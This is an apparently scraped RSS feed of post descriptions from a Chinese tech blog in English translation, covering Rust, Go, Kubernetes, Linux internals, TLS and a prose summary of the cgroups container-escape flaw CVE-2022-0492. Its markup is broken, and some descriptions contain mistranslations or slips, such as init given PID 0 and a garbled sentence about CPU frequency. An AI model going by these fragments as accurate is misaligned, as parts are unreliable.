At this point systemtap comes in handy, it adds probe probes to kernel functions, aggregates statistics on kernel space function calls, and even intervenes in them.</description>

      <description>Rust has a reputation for having a steep learning curve and a rigorous and secure language. But recently, while studying The Book, I discovered that it allows variable shadowing .
If the ordinary shadowing is not enough, the same lexical scope allows different types of variables, using the same variable name .
What else can I say but shock? Let&amp;rsquo;s look at the case of rust, go.

Box&amp;lt;T&amp;gt; allocates space on the heap, stores the T value, and returns the corresponding pointer. Also Box implements trait Deref dereference and Drop destructor to automatically free space when Box leaves the scope.

      <description>This article refers to rust book ch15 and adds its own understanding, interested parties can first look at the official documentation.
Rust has two ways to achieve mutability
 Inheritance variability: for example, if a struct is declared with let mut, then any field of the struct can be modified later. Internal mutability: use Cell RefCell to wrap a variable or field so that it can be modified even if the external variable is read-only  It seems that inheritance mutability is enough, so why do we need the so-called interior mutability internal mutability?</description>

      <description>There is no such thing as x32. x86 and x64 refer to the instruction set architecture of the CPU.
Instruction set The instruction set can be understood as the hardware&amp;rsquo;s interface to the outside world. We run programs through the operating system scheduling, and the operating system then allows the hardware to compute.
If you let the hardware compute, such as some addition and multiplication, loops and so on, you need the interface provided by the hardware, that is, the instruction set.</description>

      <description>Some time ago I drilled into How to master advanced TypeScript patterns this article. This is an earlier blog post by Pierre-Antoine Mills, author of ts-toolbelt. The article raises a challenging topic: How can TS write type support for collinear functions? I did some practice with the original article, and then seemed to come to some knowledge about TS generics closer to the substance &amp;ndash; from the collection perspective. Based</description>

      <description>In my work I often find that many engineers&amp;rsquo; Golang unit tests are written in a problematic way, simply calling the code for output and including various IO operations, making it impossible to run the unit tests everywhere.

      <description>A new cgroups vulnerability, codenamed CVE-2022-0492, which could be abused to evade containers in order to execute arbitrary commands on the container host.
The vulnerability comes from a Linux kernel feature known as cgroups control group, cgroups allows processes to be organized into hierarchical groups so that CPU, memory, and other resource usage, disk I/O, and networking can be limited and monitored.
However, because cgroups lacks internal validation of the release_agent file and fails to properly check whether the process setting the release_agent file has administrative privileges, an attacker can use this cgroups v1 release_agent feature to elevate privileges and accidentally bypass namespace isolation.</description>

      <description>The project uses argo-workflow as the workflow engine to orchestrate and run some hyperconverged cluster deployment related tasks, and the whole environment runs on a single node K3s. The main reason for choosing argo-workflow + K3s is to consume as few system resources as possible, since this environment will run on various laptops with different hardware configurations in the future 😂. After researching some common K8s deployment tools, we finally chose K3s, which consumes less system resources.</description>

      <description>Someone mentioned a problem before, it is about Prometheus monitoring Job task false alarm problem, the general meaning of the CronJob control Job, the front of the execution failed, monitoring will trigger the alarm, after the solution to generate a new Job can be executed normally, but will still receive the alarm in front.
This is because we generally keep some history when executing Job tasks to facilitate troubleshooting, so if there is a failed Job before, even if it will become successful later, the previous Job will continue to exist, and the default alarm rule used by most direct kube-prometheus installation and deployment is kube_job_ status_failed &amp;gt; 0, which is obviously inaccurate.</description>

      <description>DNS systems use plaintext UDP protocol to communicate by default, so the content of users&amp;rsquo; queries can be easily monitored, and the resolution results returned by servers can be easily tampered with. To solve this problem, technologies such as DNS over HTTPS/TLS/QUIC have been introduced in the hope of transmitting DNS queries in an encrypted manner. However, with the use of public DoH recursive resolution servers, authoritative DNS servers can only get the address of the recursive resolution server, but not the user&amp;rsquo;s address.</description>

The reason is that the two routes have the same HTTP method (meaning GET/POST/PUT/DELETE, etc.) and request path prefix, and in the same route location, the first route is a wildcard (meaning :id of this form) parameter, and the second route is a normal string info, then a route conflict occurs.</description>

But since I work with it very little, I often forget the specific details of this standard, so I wrote this article to document it in detail.
How do you represent numbers? There are many ways to represent numbers. For example, the most common way we use when writing - fixing the position of the decimal point, placing a decimal point in the middle of several numbers to represent a decimal, or a whole number if there is no decimal point.</description>

Preview Link: https://codepen.io/Chokcoco/pen/BamYMYg
It is implemented with the JS animation library GSAP. Take a look.
I wondered if I could use CSS to achieve the same effect. After trying it out, I managed to achieve the original effect using pure CSS.
The core of the above effect is the animation of the text, which changes from thinner and tighter to thicker and farther apart.</description>

This is not easy to achieve when the platform we use to develop the application is different from the target platform for deployment. For example, developing an application on an x86 architecture and deploying it to a machine on an ARM platform usually requires preparing the ARM platform infrastructure for development and compilation.</description>

      <description>Merging is a very common operation in Git: you can merge changes between branches, or perform pull and push operations on remote branches.
However, the git merge command can be a bit daunting for newcomers, because you can get different results from running merge in different situations. This uncertainty about the results has kept me from actively using it for a long time, and I&amp;rsquo;ve relied on visual interfaces like GitHub&amp;rsquo;s Pull Request or GitLab&amp;rsquo;s Merge Request to merge manually.</description>

According to the proposal, &amp;ldquo;Go arena&amp;rdquo; is used to optimize memory allocation. arena is a method of allocating a set of memory objects from contiguous memory regions, with the advantage that allocating objects from arena is generally more efficient than general memory allocation. More importantly, objects in arena can be released all at once with minimal memory management or garbage collection overhead.</description>

      <description>MongoDB is a free open source document database. It belongs to a family of databases called NoSQL, which is different from traditional table-based SQL databases such as MySQL and PostgreSQL.
In MongoDB, data is stored in flexible JSON-like documents, with fields varying with the document. It does not require a predefined schema and the data structure can change over time.
This tutorial describes how to install and configure MongoDB Community Edition on CentOS 8 server.</description>

      <guid>https://www.sobyte.net/post/2022-03/organizing-typescript-code-using-namespaces/</guid>
      <description>With the increasing use of third-party libraries in software, we often encounter the problem of global namespaces being polluted, leading to name conflicts between components in the global namespace. As a result, we need to use namespaces to organize blocks of code in order to uniquely identify variables, objects, and classes.
In this article, we will discuss namespaces, when they are needed, and how they can be used to enhance the organization of TypeScript code.</description>

      <guid>https://www.sobyte.net/post/2022-03/typescript-dependency-injection-containers/</guid>
      <description>The original JavaScript environment lacked a static type system and had little support for containerized dependency injection, making the code I wrote prone to obvious errors and nearly impossible to test.
TypeScript&amp;rsquo;s compile-time type system changes all that, allowing continuous development of complex projects. It has brought back design patterns such as dependency injection, proper typing and passing of dependencies during object construction, which promotes more structured programming and helps write tests without the need for patching.</description>

      <description>In early 2008, Australian brothers Simon Zerner and Toby Zerner started the development of esoTalk. Unfortunately, esoTalk was still in Alpha phase when the lead developer brother Simon passed away in mid-2009.
It was his brother Toby who replaced Simon in maintaining and updating esoTalk.
In the README.md file, it says: &amp;ldquo;esoTalk was developed by Toby Zerner in memory of his brother Simon.&amp;rdquo; In the end, the two brothers left behind an open source forum system developed with PHP+MySQL, with very simple, fast and modern features.</description>

      <description>The Image Widget in Flutter has built-in support for files in the form of file, network, and memory. However, these only support regular compressed image files or binary data, such as jpg, png, webp files, etc. There is no support for raw rgba binary data. Raw binary data here refers to the array of bytes consisting of the color values of each pixel of an image. A picture has width x height pixel points, the color value of a pixel point is stored with 32bit, divided into 4 channels, each channel occupies 8bit, respectively, red, green, blue, transparency (RGBA), this array is the collection of color values of each pixel point, dart in general use Uint8List.</description>

      <guid>https://www.sobyte.net/post/2022-02/memcached-meta-commands/</guid>
      <description>Memcached is the oldest in-memory caching server. Because it doesn&amp;rsquo;t support as rich a data structure as Redis, Memcached is used less and less. But I think Memcached is a great example of the Unix philosophy of doing one thing at a time and doing it well. And Memcached is focused on the one thing that is memory caching. This is best demonstrated by the introduction of Meta Commands in Memcached in version 1.</description>

      <description>According to news on the Linux kernel mailing list, the community recently discussed whether to adopt the modern C language standard for the kernel.
While the Linux kernel is evolving rapidly, it also relies on some very old tools, one of which is that the kernel code is still using the 1989 version of the C language standard - a standard that was written more than 30 years ago before the kernel project was started.</description>

      <description>Before we get into the Zombie process, let me recall what a process is in Linux.
In short, a process is a program instance. It can be foreground (interactive process) or background (non-interactive or automatic process). It can be a parent process (the creator of other processes at runtime) or a child process (a process created by other processes).
In Linux, every process has a parent process, except for the first init (or systemd) process with a PID of 0.</description>

      <description>The seq command is an abbreviation for sequence and is used to print a sequence of numbers in increasing or decreasing order. In other words, it prints a range of specified values. The numbers can be integers or real numbers with decimal points, or negative numbers. You can also specify the upper or lower limit of the sequence, etc.
In this tutorial, we will explain how to use the seq command and seq common command options, such as printing a sequence of numbers up to the upper limit, printing a specified value between the lower and upper digits, printing a sequence with custom increments, printing a sequence in decreasing or inverted order, printing a sequence with the same number of digits, printing a sequence in a specified format, printing a sequence using a specified separator, and finally we give you a practical application example for your reference.</description>

In this article, AWS compares Rust and Go as examples. AWS believes the reason for this is that Go is a garbage collection (GC) language, so when objects are created and released, the garbage collector needs to stop the program every once in a while and run a garbage collection. When the garbage collector is running, the process cannot respond to requests.</description>

      <description>We know that using Linux swap space instead of RAM (memory) can seriously degrade performance. So, one might ask, since I have enough available memory, wouldn&amp;rsquo;t it be better to remove the swap space? The short answer is no. Enabling swap space brings performance benefits, even if you have more than enough RAM.
Even with enough server memory installed, you will often find that you will use swap space after a long period of normal operation.</description>

      <description>The StateOfJS 2021 State of JavaScript Survey reports that JavaScript is in a much better state than it was in 2016. When the first State of JS survey was conducted, TypeScript usage was only 21%; today it is 69%. This is followed by Elm at 2.4 percent, Flow at 1.7 percent, and CoffeeScript at 1.4 percent.
The report was actually delayed to 2022 due to the large number of matters in 2021.</description>

      <description>Greg Brockman, CTO of OpenAI, a nonprofit artificial intelligence research company, today posted a tweet about &amp;ldquo;error messages&amp;rdquo; in programming, saying that one of the most underappreciated skills in programming is writing friendly error messages. Greg believes that a good error message should be self-explanatory and have three main points:
 what the user did. what acceptable inputs are. how to fix the problem.  Musk also commented on his opinion in this tweet, which he fully agrees with, and also said that compilers for programming languages could be better because not enough is currently being invested in them.</description>

      <guid>https://www.sobyte.net/post/2022-02/force-delete-k8s-terminating-namespace/</guid>
      <description>When deleting a namespace, the delete operation is interrupted when it is not completely deleted, and the namespace is in the terminating state. One solution is to delete again with the --force option after the command, e.g.
1  kubectl delete ns &amp;lt;terminating-namespace&amp;gt; --force   But it often doesn&amp;rsquo;t work, so you need to use the interface to delete the namespace.
First, export the namespace information for the terminating state to a json file.</description>

      <description>Sigstore is the latest project of Linux Foundation, which is a new model of software signature based on Certificate Transparency Log.
Sigstore solves the problem of keeping private keys caused by traditional PGP signatures, it has excellent openness and scalability, and is known as the Let&amp;rsquo;s Encrypt of software signatures.
TL;DR Briefly, what the Sigstore project implements is to record the information of each signature through the Certificate Transparency Log, and end users query the Log and verify it when they need to use it.</description>

      <description>nodejs makes it easy for us front-end developers to do some server-side operations seamlessly. Other back-end languages like php, golang, java, etc. require a certain amount of learning cost, while nodejs is customized for front-end developers. In nodejs, a native http module is provided, and we can use the http module to make a few common widgets that can greatly facilitate our work. 1. A simple HTTP service Building an</description>

      <description>Starting with C++11, the standard library has been extended for associative containers to provide associative containers based on hash table implementations. A hash table will take up more memory than the stored elements in exchange for evenly spreading O(1) performance. Hash Tables There are many strategies for resolving conflicts, the standard library chooses to use the separate linking method, where conflicting elements are placed in one location and stored in</description>

      <description>Nine years after the release of TLS 1.2, and four long years of agreement on it, TLS 1.3 is now available, designed with the simple goal of making data transfers faster and more secure.
More secure TLS uses a hybrid encryption process, which means that symmetric encryption is used during communication and the key for that encryption is negotiated through asymmetric encryption. The MAC algorithm is used for integrity checking and the certificate system is used for authentication.</description>

      <description>Although TLS can encrypt the entire communication process, there are still many privacy-sensitive parameters that have to be transmitted in plaintext during the negotiation process, the most important and problematic of which is the domain name to be accessed, i.e. SNI (Server Name Indication). There is also the ALPN extension used to inform the client of the available application layer protocols, and compromising this could lead to an attacker knowing the services supported by the server and the purpose of the connection.</description>

TLS (Transport Layer Security), formerly known as SSL (Secure Socket Layer), is located between TCP and the application layer. Compared to HTTP, HTTPS does not change the protocol itself, but adds a layer of TLS between TCP and HTTP for encryption to ensure information security.
For information transmitted in clear text, there are several risks</description>

      <description>There are many ways to store data today, and hard drives are the preferred choice for most users because of their price and data protection advantages. However, hard disks are several orders of magnitude slower than memory in terms of IO reads and writes, so why would you prefer hard disks?
The first thing that needs to be mentioned is that the main reason why operating a disk is slow is because of the time consuming read and write to the disk.</description>

      <description>We usually use domain names, such as taoshu.in, to access the Internet. But computers need to use IP addresses when they communicate. The core function of DNS is to save the mapping between domain names and IP addresses. Today, we will introduce how DNS works.
In DNS, the core concept is the domain name. A domain name is a way of organizing information hierarchically, somewhat similar to a computer&amp;rsquo;s folders. Take a Windws system for example, the path where user Demo&amp;rsquo;s desktop is located is C:\Users\Demo\Desktop.</description>

When I communicate and discuss with these companies, including implementation and program comparison, there are a lot of comparisons and compromises of various programs. Today, I would like to write this article to summarize my personal experience and ideas in the hope that more people can refer to and learn from them, and be able to make a better architecture.</description>

      <description>Flow line work models are common in industry, dividing the workflow into multiple segments, each with the right number of personnel depending on the intensity of the work. A good assembly line design tries to balance the flow rate of each step to maximize productivity.
Go is a practical language, and the pipeline work model is very well integrated with Go.
pipeline A pipeline consists of multiple links, specifically in Go, where the links communicate with each other via channels and the same link task can be processed by multiple goroutines at the same time.</description>

Google&amp;rsquo;s new Chrome OS Flex is a chance to rejuvenate these old devices.
Chrome OS Flex is a new system from Google that differs from regular Chrome OS in that you can install it on devices that were originally based on Windows or macOS (not ARM chips), turning them into Chromebooks.</description>

1 2 3 4  @FunctionalInterface public interface Callable&amp;lt;V&amp;gt; { V call() throws Exception; }   In JDK 1.8, an interface with only one method declared is a functional interface. A functional interface can be modified with or without the @FunctionalInterface annotation. As long as an interface contains only one method, then the interface is a functional interface.</description>

      <description>Recently, while reading Go1.18 Release Notes, I found that the Title method of the strings, bytes standard library has been deprecated. Why is this?
Introduction Here is an example of the strings standard library. The strings.Title method does the following: maps all Unicode letters at the beginning of a word to its Unicode title case.
The example is as follows.

      <description>Lisp is a computer programming language invented by John McCarthy in 1958. The name &amp;ldquo;Lisp&amp;rdquo; is an abbreviation for &amp;ldquo;List Processing&amp;rdquo;, which means table processing&amp;hellip; The above is probably the accepted authoritative introduction, and a lot of information on the Internet probably says so.

 Usually we use #include to include header files, as follows.

Introduction OverScroller in Android is responsible for calculating the real-time sliding position for ListView, RecyclerView, ScrollView and other scrolling controls, and these position algorithms directly affect the experience of each scroll. As we all know, Android&amp;rsquo;s animation experience is ~far~ inferior to iOS, and even now that Android generally supports 120Hz high swipe, the experience is not very comfortable.

      <description>Kubernetes started out by providing only Extender. The Extender scheduler plugin, which enables non-intrusive extensions by deploying a web service, has several problems.
 The number of Extender extensions is limited: only &amp;ldquo;Filter&amp;rdquo; and &amp;ldquo;Prioritize&amp;rdquo; extensions are available during scheduling. The &amp;ldquo;Preempt&amp;rdquo; extension is called after running the default preemption mechanism. &amp;ldquo;Extender cannot be called at other points, e.g. not before running the predicate function. Performance issues: Each call to an extender involves JSON coding and decoding.</description>

Some people may say that if the cable is unplugged, it means the physical layer is disconnected, so the upper transport layer should also be disconnected, so the original TCP connection will not exist. Just like when we make a wired phone call, if one party&amp;rsquo;s phone line is unplugged, the call is completely disconnected.</description>

      <description>1. What is buffer mapping Without giving a definition, simply put, after mapping (Mapping) a certain piece of video memory, it can be accessed by the CPU. After the Buffer (meaning video memory) of the three graphics APIs (D3D12, Vulkan, Metal) is mapped, the CPU will be able to access it, and at this point, note that the GPU can still access this piece of video memory. This leads to</description>

      <description>How to implement a thread pool Thread pooling: a thread usage pattern. Too many threads introduce scheduling overhead, which in turn affects cache locality and overall performance. Instead, a thread pool maintains multiple threads waiting for a supervising manager to assign tasks that can be executed concurrently. This avoids the cost of creating and destroying threads while processing short time tasks. Thread pools not only ensure full utilization of the</description>

      <description>There is a long-standing debate about whether to use Preact or React, the MIT-licensed open source software that has over 26k stars on GitHub and 1/4 million downloads per week on NPM. And React, an internal project from Facebook, has become one of the mainstream front-end frameworks after being open-sourced in 2013.
Baidu has asked to stop using React / React Native internally for a long time, and Ali has started to pilot Preact in some of its businesses.</description>

There are cases where we need to make sure that one thread has an exclusive share of the data and that other threads cannot access it. A typical case is the errno global variable, which always stores the error code of the last call of the current thread, without thread</description>

Although this is theoretically true, how do 32-bit and 64-bit perform in actual tests?</description>

The main options In NodeJS, there are two main options for communicating with code written in other languages.
 Using the AddOn technique, write an extension to NodeJS using C++ and then call the source code or dynamic libraries written in other languages in the code using the FFI (Foreign Function Interface) technique, which brings in dynamic libraries written in other languages directly in Node  A comparison of these two approaches shows that each has its own advantages and disadvantages.</description>

Later, when people look back and reflect, there is no shortage of people who think: &amp;ldquo;If Linux had not flourished, FreeBSD would have filled the void today.&amp;rdquo;
BSD (Berkeley Software Distribution, also known as Berkeley Unix), the most inextricable offshoot of Unix, had its cradle at the University of California, Berkeley, the most radical leftist stronghold in the United States at the time.</description>

      <description>Google has recently released the latest version of Chrome Canary, in which Chrome has a &amp;ldquo;brand new&amp;rdquo; logo, which is the fourth version of Chrome&amp;rsquo;s logo since its birth in 2008.
Although this is a &amp;ldquo;new&amp;rdquo; logo for Chrome in 8 years, you can see that the changes are not too drastic. Even at first glance, you can hardly tell what has changed.
So let&amp;rsquo;s take a look at some of the design details and see what&amp;rsquo;s different between the new version and the old one.</description>

      <description>MariaDB, an open source database company said, plans to become a public company with the help of Angel Pond Inc.
Based in Helsinki, Finland, MariaDB originally emerged as an offshoot of MySQL. This was because the founders of the MySQL project had concerns about its independence after Sun Microsystems acquired MySQL in 2008.
MariaDB&amp;rsquo;s CTO was Michael Widenius, one of the founders of MySQL, and MariaDB was named after Widenius&amp;rsquo; youngest daughter.</description>

      <description>Developer Mishaal Rahaman broke the news on social media platforms that he found a series of code changes in AOSP that highlight that Google is trying to shorten the CPU frequency by boosting game load times. Specifically, they are developing a new API that will allow games to communicate their current state to the OS. If the game takes time to load, the OS will send a command; the CPU will then run at a higher frequency, thus reducing the game load time.</description>

      <description>If you haven&amp;rsquo;t heard of Golang&amp;rsquo;s not addressable concept, it doesn&amp;rsquo;t matter, it literally means that you can&amp;rsquo;t get the address of a value. Let&amp;rsquo;s start with a simple example.

      <description>Developers often need to track performance bottlenecks in applications in production environments and try to identify the root cause of the bottlenecks. To do this, they typically gather this information through logs. Unfortunately, this approach can be time-consuming and does not provide sufficiently detailed information about the underlying problem.
A modern and more advanced approach is to apply and use profiling techniques and tools that highlight the slowest application code and methods that consume most of the resources (such as CPU and memory).</description>

      <description>The Go source code directory structure and corresponding code files provide an insight into Go&amp;rsquo;s implementation of network I/O modes on different platforms. For example, it is based on epoll on Linux, kqueue on freeBSD, and iocp on Windows. Since our code is deployed on Linux, this article uses the epoll wrapper implementation as an example to explain the source code implementation of I/O multiplexing in Go.

      <description>Recently I had a requirement at work, which simply means that millions of timer tasks will be created in a short period of time, and the corresponding amounts will be added up when they are created to prevent overselling, and the data will need to be checked again after half an hour, and if the data does not match, the added amount will need to be subtracted back.

      <description>Overview When we think of &amp;ldquo;scheduling&amp;rdquo;, the first thing that comes to mind is the scheduling of processes and threads by the operating system. The operating system scheduler schedules multiple threads on the system to run on the physical CPU according to a certain algorithm. Although threads are relatively lightweight, they do have a large additional overhead when scheduling. Each thread takes up more than 1M of memory space, and</description>

      <description>Introduction In our work, if we encounter such things as web URL de-duplication, spam identification, or the determination of duplicate elements in a large collection, we usually think of saving all the elements in the collection and then determining them by comparison. If we use the best performance Hash table to make the determination, then as the number of elements in the collection increases, the storage space we need will</description>

      <description>Introduction Prior to 1.14 of Go, preemptive scheduling was collaborative and required self-initiated ceding of execution, but this could not handle edge cases that could not be preempted. Some of these problems were not solved until 1.14 by signal-based preemptive scheduling, such as for loops or garbage collection of long-running threads. Here is an example to verify the difference in preemption between 1.14 and 1.13. 1 2 3 4 5</description>

Daniel explains the reasons for adding native JSON support to cURL:
 sending JSON is a common practice in areas such as REST APIs &amp;ldquo;Ease of use with JSON&amp;rdquo; was a common consideration when many people were asked about choosing a cURL alternative on sites like Stack Overflow, a significant number of people were unable to send the correct JSON and quote JSON correctly using cURL because JSON uses double quotes and the Shell does not expand variables inside single quotes  Daniel also said that since he doesn&amp;rsquo;t send JSON very often, it wasn&amp;rsquo;t appropriate to rely entirely on him to design this feature.</description>

      <guid>https://www.sobyte.net/post/2022-01/cpp-threading/</guid>
      <description>Today I would like to introduce the C++ threaded high-level APIs: std::promise, std::future, std::packaged_task and std::async. The content of this article can be condensed into the following diagram.
where std::promise and std::future are synchronisation channels between threads. The std::packed_task class template is an adapter for a function or a function object. It wraps the return value of a function in std::future, allowing us to easily execute any function with std::thread. The std::async function is equivalent to the sum of std::packaged_task and std::thread.</description>

      <description>This article provides an easy and quick introduction to the principles and implementation of the CFS scheduler, a fully fair class scheduling class in the Linux kernel.
Principle The core principle of the CFS (Completely Fair Scheduler) is simple: each process is given as &amp;ldquo;fair&amp;rdquo; a runtime as possible. So the process that has run the least in the past is chosen to run each time. Of course, as a scheduler, it has to meet much more than that, and a number of features such as Linux&amp;rsquo;s preemptive processes and support for priorities in the Completely Fair class fair_sched_class make the design of CFS much more complex than simply picking the least amount of runtime.</description>

With the release of Kubernetes v1.23, the HPA API came to a stable version autoscaling/v2:
 Scaling based on custom metrics Scaling based on multiple metrics Configurable scaling behaviour  From the initial v1 version of HPA, which only supported CPU and memory utilisation scaling, to the later support for custom metrics and aggregation layer APIs, to v1.</description>

      <description>Previously, Yu Zhao from Google submitted a Patch to the Linux kernel that modified the page swap algorithm in the kernel memory management module, proposing a multi-level LRU. This article takes you through the advantages of the page swap algorithm and multi-level LRU.
What are pages and page replacement We know that memory paging mechanisms are used on almost all modern operating systems and processors. In some embedded operating systems and in special cases where processor resources are tight and there is no need to consider inter-process safety, or even the concept of threads, memory paging is not necessary.</description>

      <description>Earlier in 2021, Python author Guido van Rossum was rehired by Microsoft to continue work on CPython, and they have proposed a faster-cpython project to improve the performance of CPython by a factor of 5 over 4 years. The whole project is open on GitHub&amp;rsquo;s faster-cpython group, and some of the ideas have been implemented and verified through Activity.
In this article, we will read and analyse the source code of one of the project&amp;rsquo;s key proposals, PEP 659, and learn how to optimise virtual machine performance at the bytecode level.</description>

If for some reason users do not want these search engines in their browser, they can remove them from the settings.
However, in a recent update to Chromium 97, Chromium has changed these settings and the option to &amp;lsquo;remove&amp;rsquo; these default search engines no longer exists.</description>

      <description>A week after the authors of Faker.js vandalised their own open source projects, Faker.js and colors.js, Faker.js is now controlled by the community. The project is currently managed by a team of eight engineers from a variety of backgrounds and companies.
Faker.js is a very popular Node.js tool library that provides various types of mock data for development debugging. The earliest Faker project was first implemented in 2004 by Jason Kohles using Perl.</description>

      <description>2021 saw the consolidation of a number of kernel improvements, the introduction of new hardware support and much more. But while the year looks good for movement in the Linux kernel, the actual number of commits and lines is lower than ever.
The tech site phoronix has summarized the relevant 2021 Git development statistics. As of December 31, 2021, when running GitStats on the Linux kernel source tree, the repository had received 1,060,172 commits from about 243,000 different authors.</description>

      <description>Background We usually encounter a lot of file system anomalies after a system crash. We usually fix them with the fsck tool, today we will learn what fsck does and how it does it.
Workload example Suppose there is a workload that appends a single block of data to an existing file. The append is done by opening the file, calling lseek() to move the file offset to the end of the file, and then issuing a single 4KB write to the file before closing it.</description>

      <description>The need for cross-tab communication is common in scenarios where there is a lot of content to browse or manipulate (e.g. blogs or CMS systems) and data consistency needs to be maintained. Most of these scenarios can be solved by bringing in a back-end service to keep the data consistent across multiple tabs by polling and so on. This article describes a pure front-end solution for cross-tab communication without introducing</description>

      <description>useCallback takes a callback function and an array of dependencies as arguments, and returns the cached callback function if each item in the dependency array remains the same.
Since useCallback can cache functions, wouldn&amp;rsquo;t all functions in the Function component be wrapped in useCallback for the purpose of React application optimization? Don&amp;rsquo;t worry, let&amp;rsquo;s take a look at two examples and decide which one is better, App1 or App2?

Think back to how we normally manipulate cookies. For example, if you want to retrieve a cookie, you have to parse it manually to get the value of a cookie because document.cookie returns a string that is the union of all cookies.

      <description>Javascript&amp;rsquo;s base type (POD) and JSON actually have only one numeric type: Number. Number is usually represented by the 64-bit floating-point standard in IEEE-754 in mainstream browser implementations (i.e., double-precision floating-point), which represents valid numbers in the range \(-(2^{53} - 1)\) ~ \(2^{53} - 1\) . While 64-bit data types are often used in Go language, e.g., int64/uint64, such values are not safe to use in Javascript.
If you look at the JSON specification document, there is no limit to the number of bits, and any large value can be placed in JSON.</description>

      <description>Hive Introduction Hive, implemented by Facebook and open source, is a data warehouse tool based on Hadoop. It maps structured data into a database table and provides HQL (Hive SQL) queries. The underlying data is stored on HDFS, and Hive essentially converts SQL statements into MapReduce tasks to run, making it easy for users unfamiliar with MapReduce to process and compute structured data on HDFS using HQL, suitable for offline</description>

      <description>When we are using Linux, if there is a problem with network or disk I/O, we may find that the process is stuck, even if we use kill -9, we cannot kill the process, and many common debugging tools such as strace, pstack, etc. are not working.
At this point, we use ps to view the list of processes and see that the status of the stuck process is shown as D.</description>

      <description>1. Preface So far in front-end development, asynchronous problems have experienced the despair of Callback Hell, the normative melee of Promise/Deffered, the invincibility of Generator, and now the acceptance of Async/Await by the public, in which Promise and Async/Await are still active in code. Their perceptions and evaluations have been reversed many times, and they have their own fans, creating a love-hate relationship that continues to this day, and the</description>

      <description>After the author of Faker.js emptied the project&amp;rsquo;s repository code, another software author has been disappointed that companies have used his open source project without giving anything back. on January 11, Christofer Dutz, creator of Apache PLC4X, posted on GitHub, stating that he will stop providing free community support to corporate users of PLC4X due to the lack of any form of return. If no company is willing to step forward to fund the project, he will cease maintenance and any form of support for PLC4X.</description>

      <description>This article breaks down the Go timer. Timers are an important part of both business and infrastructure development, which shows how important they are. Whether we initialise a timer with NewTimer, timer.After, or timer.AfterFun, the timer is eventually added to a global timer heap, which is managed by Go runtime. The global timer heap has also undergone three major upgrades. Before Go 1.9, all timers were maintained by a globally</description>

      <description>1. Background In existing network environments, some businesses using Redis clusters often need to expand their node capacity as business volume increases. I have previously learnt that some of my operations and maintenance colleagues have experienced a decrease in performance after scaling a Redis cluster with a relatively large number of nodes, as evidenced by a significant increase in access latency. Some businesses are sensitive to Redis cluster access latency,</description>

      <description>Memory cgroup leaks are a common problem in K8s (Kubernetes) clusters, resulting in nodes being stretched for memory resources, or nodes becoming unresponsive and having to restart the server to recover. Most developers use regular drop cache or disable kernel kmem accounting to circumvent this problem. This paper analyses the root cause of memory cgroup leaks and provides a solution to fix the problem at the kernel level, based on a practical example from the NetEase Digital Sail kernel team.</description>

      <description>Ubuntu already supports the 4GB and 8GB memory versions of the Raspberry Pi 4 Model B (supported since Ubuntu 20.10). Now the Ubuntu team plans to lower the hardware barrier for Ubuntu even further by making the upcoming Ubuntu 22.04 LTS version to run on a Raspberry Pi 4 with only 2GB RAM.
However, getting a full Linux system like Ubuntu to run properly on a hardware device with too little memory can be difficult, so how does Ubuntu do it?</description>

For historical reasons, e-mail uses many different protocols and each protocol uses a different TCP port, which greatly increases the difficulty of setting up e-mail and is very unfriendly to users who do not know computer expertise. Today, we will introduce the relevant protocols and ports systematically, and try to clear the obstacles for novice users.</description>

      <description>Most implementations of coroutines are based on some kind of runtime yield primitive. However, kotlin does not have this kind of lower-level support, and still implements coroutines based on CPS transformations on jvm, which does not have yield instruction support.
It&amp;rsquo;s actually quite impressive, and I&amp;rsquo;d like to know how it&amp;rsquo;s done.

      <description>ZGC is a new generation of garbage collector introduced from jdk11, the expected stopping time is less than 10ms, and the stopping time is independent of heap size, and it can support tb-level heap.
As a fan of go, isn&amp;rsquo;t go&amp;rsquo;s GC already pretty good? The Initial Mark has a little STW, and the usual gc pause is less than ms? In fact, the effect of go GC is still far from the promise of ZGC, not when it comes to large heaps.</description>

The same as percolator, crdb also implements multi-line transaction management according to decentralized transaction manager.</description>

For example, for a generic function, its implementation is the same for all types (type sets) that satisfy the generic argument. If we want to do a special implementation of the function for one of these type sets, some languages that support generic specialization can</description>

Uber&amp;rsquo;s current service scale is about a few thousand microservices, based on the scheduling infrastructure on the cloud for deployment. Most of the services are written by GO, and the author of this article is doing Maps Production Engineering, a group that has helped some Java systems to adjust GC parameters before (this should be the starting point for them to help Go to do optimization and think about how to adjust parameters).</description>

      <description>Yesterday, I was working with a colleague to troubleshoot a problem with a VM IP change, so I just wanted to organize the DHCP lease life cycle and the change process.
DHCP lease lifecycle  Allocation: A client starts with no valid lease, and therefore no DHCP-assigned address. It acquires a lease through an allocation process. Reallocation: If a client already has an address from an existing lease, then when it reboots or starts up after shutdown, it contacts the DHCP server that granted it the lease to confirm the lease and obtain operational parameters.</description>

      <description>I recently encountered a failure where a disk partition was found to become read-only during a cluster software upgrade, causing the storage application to recognize the disk as unavailable. Investigation revealed that the cluster upgrade process regenerates the GRUB configuration file for each node, which causes the disk partition to become read-only during the execution of grub2-mkconfig. Document the flow of the grub2-mkconfig command execution until the real disk read-only command is issued.</description>

 The structure of a windowed Flink program is usually as follows, with both grouped streams (keyed streams) and non-keyed streams (non-keyed streams). The difference between the two is that the grouped streams call the keyBy(...)  method in grouped streams and windowAll(...)  instead of the window(.</description>

      <description>As any developer familiar with Python knows, Python has default parameters that allow us to optionally override certain default parameters as needed when instantiating an object to determine how to instantiate the object. This feature is great for elegantly simplifying code when an object has multiple default arguments.
The Go language does not syntactically support default parameters, so in order to create objects both by default parameters and by passing custom parameters, we need to use some programming tricks to achieve this.</description>

      <description>KPTI in a Nutshell The KPTI (Kernel Page Table Isolation) mechanism was originally designed to mitigate KASLR bypass and CPU-side channel attacks.
In the KPTI mechanism, the isolation of memory in kernel state space from user state space has been further enhanced.
 The page table in the kernel state includes the page table of user-space memory and the page table of kernel-space memory. The page table in the user state includes only the page table of user space memory and the page table of kernel space memory as necessary, such as the memory used for handling system calls, interrupts, and other information.</description>

But its official package manager is a proprietary zypper, which works quite well, and the software is quite new. I recently switched from Manjaro to openSUSE and found that the KDE desktop is indeed smoother than Manjaro and the community source OBS experience is more comfortable than AUR. Especially for containers/Kubernetes, the source is richer than AUR and is</description>

      <description>On linux systems, you can kill processes by typing &amp;lt;Ctrl+C&amp;gt; in bash or by using the command kill -9 $pid, but they are very different.
Let&amp;rsquo;s put the conclusion first: kill command will only kill the target process, while bash shortcut will kill the whole foreground process group!
linux process killing methods Regardless of the method used, killing processes is done by sending a signal. The kill command actually sends a signal to the target pid process.</description>

